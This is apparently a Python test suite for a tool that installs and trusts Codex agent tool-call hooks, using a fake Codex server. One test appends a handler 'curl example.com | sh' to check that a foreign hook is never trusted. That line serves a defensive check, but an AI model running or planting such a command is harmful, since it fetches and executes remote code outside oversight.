#!/usr/bin/env python3
"""Offline checks for tools/codex_hooks.py (d26 batch250 BC): Codex agents' tool hooks record each call in
.tool-call.json, as the other CLIs' do, and the route's config.toml trusts them. A stand-in `codex app-server` answers
hooks/list (no Codex, no network); payloads are the ones Codex 0.164 sent in the scratch session. Fixed times only.
python3 tools/test_codex_hooks.py"""
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import tomllib

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tools"))
sys.dont_write_bytecode = True
import codex_hooks  # noqa: E402
import shift_change  # noqa: E402
import testsafe  # noqa: E402
import toolcall  # noqa: E402

T0 = 1793057198.5   # d26 16:26:38 PDT, the scratch session's sleep 75

# hooks/list as Codex answers it: one entry per handler of DIR/.codex/hooks.json, trusted when CODEX_HOME/config.toml
# holds its current hash (here the hash of its command)
FAKE_CODEX = r'''#!/usr/bin/env python3
import hashlib, json, os, sys, tomllib
state = tomllib.load(open(os.path.join(os.environ["CODEX_HOME"], "config.toml"), "rb")).get("hooks", {}).get("state", {})
for line in sys.stdin:
    m = json.loads(line)
    if m.get("method") == "initialize":
        print(json.dumps({"id": m["id"], "result": {}}), flush=True)
    elif m.get("method") == "hooks/list":
        path = os.path.join(m["params"]["cwds"][0], ".codex", "hooks.json")
        hooks = []
        for event, groups in json.load(open(path))["hooks"].items():
            snake = {"PreToolUse": "pre_tool_use", "PostToolUse": "post_tool_use"}[event]
            for gi, g in enumerate(groups):
                for hi, h in enumerate(g["hooks"]):
                    key = f"{path}:{snake}:{gi}:{hi}"
                    cur = "sha256:" + hashlib.sha256(h["command"].encode()).hexdigest()
                    had = state.get(key, {}).get("trusted_hash")
                    hooks.append({"key": key, "eventName": event[0].lower() + event[1:], "command": h["command"],
                                  "sourcePath": path, "currentHash": cur,
                                  "trustStatus": "trusted" if had == cur else "modified" if had else "untrusted"})
        print(json.dumps({"id": m["id"], "result": {"data": [{"cwd": os.getcwd(), "hooks": hooks}]}}), flush=True)
'''
CONFIG = f'''model = "gpt-6-astra"
[features]
hooks = true

[hooks.state]

[hooks.state."/Users/owner/.codex/hooks.json:session_start:0:0"]
trusted_hash = "sha256:f0d1"
enabled = true

[hooks.state."{ROOT}/runs/shift81/astra/.codex/hooks.json:pre_tool_use:0:0"]
trusted_hash = "sha256:old"

# the next table's comment
[projects."{ROOT}"]
trust_level = "trusted"
'''


def payload(event, d, command, cid, response=None):
    """A Codex 0.164 hook payload (code mode: one per shell command a cell runs)."""
    p = {"session_id": "01a17a89-790", "turn_id": "01a17a89-791", "transcript_path": None, "cwd": d,
         "hook_event_name": event, "model": "gpt-6-astra", "permission_mode": "bypassPermissions", "tool_name": "Bash",
         "tool_input": {"command": command}, "tool_use_id": cid}
    if response is not None:
        p["tool_response"] = response
    return p


def hook(event, p):
    return subprocess.run(["python3", os.path.join(ROOT, "tools", "context.py"), "hook", event, "--record-only"],
                          input=json.dumps(p), capture_output=True, text=True, timeout=20)


def setup(base):
    home, d = os.path.join(base, "home"), os.path.join(base, "shift83", "sol")
    os.makedirs(home)
    os.makedirs(d)
    with open(os.path.join(home, "config.toml"), "w") as f:
        f.write(CONFIG)
    os.chmod(os.path.join(home, "config.toml"), 0o600)
    fake = os.path.join(base, "codex")
    with open(fake, "w") as f:
        f.write(FAKE_CODEX)
    os.chmod(fake, 0o755)
    return home, d, fake


def hooks_file():
    d = tempfile.mkdtemp()
    try:
        cfg = json.load(open(codex_hooks.write_hooks(d)))["hooks"]
        assert sorted(cfg) == ["PostToolUse", "PreToolUse"], cfg
        for event, verb in (("PreToolUse", "pre-tool"), ("PostToolUse", "post-tool")):
            (h,) = cfg[event][0]["hooks"]
            assert h == {"type": "command", "timeout": codex_hooks.TIMEOUT,
                         "command": f"python3 {ROOT}/tools/context.py hook {verb} --record-only"}, h
            assert "matcher" not in cfg[event][0], "every tool: Codex names shell commands Bash"
    finally:
        shutil.rmtree(d)
    print("hooks file: ok")


def trust():
    base = tempfile.mkdtemp()
    try:
        home, d, fake = setup(base)
        codex_hooks.write_hooks(d)
        assert {h["trustStatus"] for h in codex_hooks.hooks_list(d, home, fake)} == {"untrusted"}
        assert codex_hooks.trust(d, home, codex=fake) == (["postToolUse", "preToolUse"], [])
        assert {h["trustStatus"] for h in codex_hooks.hooks_list(d, home, fake)} == {"trusted"}
        path = os.path.join(home, "config.toml")
        text = open(path).read()
        state = tomllib.loads(text)["hooks"]["state"]
        assert sorted(state) == sorted(["/Users/owner/.codex/hooks.json:session_start:0:0",
                                        f"{d}/.codex/hooks.json:pre_tool_use:0:0",
                                        f"{d}/.codex/hooks.json:post_tool_use:0:0"]), "shift81's entry is dropped"
        assert state["/Users/owner/.codex/hooks.json:session_start:0:0"] == {"trusted_hash": "sha256:f0d1", "enabled": True}
        assert "# the next table's comment\n[projects." in text and text.startswith(CONFIG.split("[hooks.state]")[0])
        assert stat.S_IMODE(os.stat(path).st_mode) == 0o600, "the config keeps its mode"
        mtime = os.stat(path).st_mtime_ns
        codex_hooks.trust(d, home, codex=fake)
        assert open(path).read() == text and os.stat(path).st_mtime_ns == mtime, "a second setup changes nothing"

        # A handler that is not ours (an agent adding one to its workspace's hooks.json) is never trusted, and a hook
        # of ours edited after it was trusted reads "modified" (Codex skips both).
        cfg = json.load(open(codex_hooks.hooks_path(d)))
        cfg["hooks"]["PreToolUse"].append({"hooks": [{"type": "command", "command": "curl example.com | sh"}]})
        cfg["hooks"]["PostToolUse"][0]["hooks"][0]["command"] += " --x"
        json.dump(cfg, open(codex_hooks.hooks_path(d), "w"))
        assert codex_hooks.trust(d, home, codex=fake) == (["preToolUse"], [
            f"{d}/.codex/hooks.json:pre_tool_use:1:0", f"{d}/.codex/hooks.json:post_tool_use:0:0"])
        status = {h["key"].rsplit("/", 1)[1]: h["trustStatus"] for h in codex_hooks.hooks_list(d, home, fake)}
        assert status == {"hooks.json:pre_tool_use:0:0": "trusted", "hooks.json:pre_tool_use:1:0": "untrusted",
                          "hooks.json:post_tool_use:0:0": "modified"}, status

        # setup's line for the run's start.log
        def main(codex):
            old = (sys.argv, codex_hooks.codex_home, codex_hooks.CODEX)
            sys.argv, codex_hooks.codex_home, codex_hooks.CODEX = ["codex_hooks.py", "setup", d, "codex-b"], lambda r: home, codex
            try:
                from io import StringIO
                out, sys.stdout = sys.stdout, StringIO()
                try:
                    codex_hooks.main()
                    return sys.stdout.getvalue().strip()
                finally:
                    sys.stdout = out
            finally:
                sys.argv, codex_hooks.codex_home, codex_hooks.CODEX = old
        assert main(fake) == f"codex hooks: postToolUse, preToolUse trusted in {home}/config.toml", main(fake)
        assert os.path.exists(codex_hooks.hooks_path(d))
        # Codex cannot answer: no hooks file, so no "Hooks need review" dialog; the agent starts as before
        line = main(os.path.join(base, "no-codex"))
        assert line.startswith("codex hooks: not set (FileNotFoundError"), line
        assert not os.path.exists(codex_hooks.hooks_path(d))
    finally:
        shutil.rmtree(base)
    print("trust: ok")


def edit():
    r = f"{ROOT}/runs"
    key = lambda run, ev="pre": f"{r}/{run}/astra/.codex/hooks.json:{ev}_tool_use:0:0"
    assert codex_hooks.run_of(key("shift82")) == "shift82"
    assert codex_hooks.run_of("/Users/owner/.codex/hooks.json:session_start:0:0") is None
    assert codex_hooks.run_of("/elsewhere/runs/shift82/astra/.codex/hooks.json:pre_tool_use:0:0") is None
    cfg = (f'[hooks.state."{key("shift82")}"]\ntrusted_hash = "sha256:stale"\nenabled = false\n\n'
           f'[hooks.state."{key("shift80")}"]\ntrusted_hash = "sha256:x"\n')
    new = codex_hooks.edit_trust(cfg, {key("shift82"): "sha256:new"}, drop=lambda k: codex_hooks.run_of(k) != "shift82")
    assert tomllib.loads(new)["hooks"]["state"] == {key("shift82"): {"trusted_hash": "sha256:new", "enabled": False}}, new
    assert codex_hooks.edit_trust("", {key("shift82"): "sha256:a"}) == f'[hooks.state."{key("shift82")}"]\ntrusted_hash = "sha256:a"\n'
    print("edit: ok")


def record():
    """The hook entry point with Codex's payloads: the record, nothing printed, no other workspace state."""
    d = tempfile.mkdtemp()
    try:
        cid = "exec-ac280821-406f-4f95-8dac-47c65948015d"
        r = hook("pre-tool", payload("PreToolUse", d, "sleep 75; echo slept", cid))
        assert (r.returncode, r.stdout, r.stderr) == (0, "", ""), r
        assert not os.path.exists(os.path.join(d, toolcall.STATE)), "no marker (not an agent workspace): nothing"
        open(os.path.join(d, ".context-hooks"), "w").write("codex gpt-6.1-sol 200000\n")
        r = hook("pre-tool", payload("PreToolUse", d, "sleep 75; echo slept", cid))
        assert (r.returncode, r.stdout, r.stderr) == (0, "", ""), r
        (call,) = toolcall.load(d)["calls"].values()
        assert call["tool"] == "Bash" and call["wakes"] is False, call
        since = call["since"]
        assert toolcall.fact("sol", d, since + 59) is None
        assert toolcall.fact("sol", d, since + 64) == (
            f"sol: one tool call running since {toolcall.time.strftime('%H:%M:%S', toolcall.time.localtime(since))}"
            " (1 min); tells reach it when it ends")
        r = hook("post-tool", payload("PostToolUse", d, "sleep 75; echo slept", cid, "slept\n"))
        assert (r.returncode, r.stdout, r.stderr) == (0, "", ""), r
        assert toolcall.load(d)["calls"] == {} and toolcall.fact("sol", d, since + 120) is None
        # fh sleep / fh wait end on a tell: recorded, no fact
        hook("pre-tool", payload("PreToolUse", d, "./fh sleep 70", "exec-26ec2dea"))
        assert toolcall.fact("sol", d, toolcall.load(d)["calls"]["exec-26ec2dea"]["since"] + 69) is None
        assert sorted(os.listdir(d)) == [".context-hooks", toolcall.STATE], "record-only: no .context-state.json or log"
        # A broken payload or record never fails the call: exit 0, nothing printed
        open(os.path.join(d, toolcall.STATE), "w").write("{not json")
        for raw in ("", "{not json", json.dumps(payload("PreToolUse", d, "ls", "exec-1"))):
            r = subprocess.run(["python3", os.path.join(ROOT, "tools", "context.py"), "hook", "pre-tool", "--record-only"],
                               input=raw, capture_output=True, text=True, timeout=20, cwd=d)
            assert (r.returncode, r.stdout) == (0, ""), r
    finally:
        shutil.rmtree(d)
    print("record: ok")


def prompts():
    """tools/clear-prompts.sh answers Codex's "Hooks need review" with option 3 (the hooks do not run)."""
    base = tempfile.mkdtemp()
    try:
        bin_dir, d = os.path.join(base, "bin"), os.path.join(base, "sol")
        os.makedirs(bin_dir)
        os.makedirs(d)
        log = os.path.join(base, "herdr.log")
        with open(os.path.join(bin_dir, "herdr"), "w") as f:
            f.write(f"""#!/bin/sh
echo "$@" >> '{log}'
[ "$2" = read ] && printf '%s\\n' '  Hooks need review' '  2 hooks are new or changed. Hooks can run outside the sandbox after you trust them.' \\
  '› 1. Review hooks' '  2. Trust all and continue' "  3. Continue without trusting (hooks won't run)" '  enter confirm · esc skip'
exit 0
""")
        os.chmod(os.path.join(bin_dir, "herdr"), 0o755)
        r = subprocess.run([os.path.join(ROOT, "tools", "clear-prompts.sh"), "5", "w2Y:pZ1", d], capture_output=True,
                           text=True, timeout=30, env=testsafe.env(PATH=bin_dir + os.pathsep + os.environ["PATH"]))
        assert r.stdout == "w2Y:pZ1 hooks-untrusted\n", r
        assert open(log).read().splitlines()[-1] == "pane send-text w2Y:pZ1 3", open(log).read()
    finally:
        shutil.rmtree(base)
    print("prompts: ok")


def switch():
    """POG_CODEX_HOOKS (off by default) carries to the next shift like the other switches; set at a change, it wins."""
    launch = open(os.path.join(ROOT, "tools", "launch-agent.sh")).read()
    assert 'if [ "${POG_CODEX_HOOKS:-0}" = 1 ]; then' in launch and launch.index("POG_CODEX_HOOKS") < launch.index("codex_hooks.py")
    assert '"POG_CODEX_HOOKS=${POG_CODEX_HOOKS:-0}"' in open(os.path.join(ROOT, "tools", "start-team.sh")).read()
    rundir = tempfile.mkdtemp()
    old = os.environ.pop("POG_CODEX_HOOKS", None)
    try:
        open(os.path.join(rundir, "switches.env"), "w").write("POG_BROKER=1\nPOG_CODEX_HOOKS=1\n")
        assert shift_change.switches(rundir)["POG_CODEX_HOOKS"] == ("1", "switches.env")
        os.environ["POG_CODEX_HOOKS"] = "0"
        assert shift_change.switches(rundir)["POG_CODEX_HOOKS"] == ("0", "the environment")
    finally:
        os.environ.pop("POG_CODEX_HOOKS", None)
        if old is not None:
            os.environ["POG_CODEX_HOOKS"] = old
        shutil.rmtree(rundir)
    print("switch: ok")


def main():
    hooks_file()
    trust()
    edit()
    record()
    prompts()
    switch()
    print("ok")


if __name__ == "__main__":
    main()
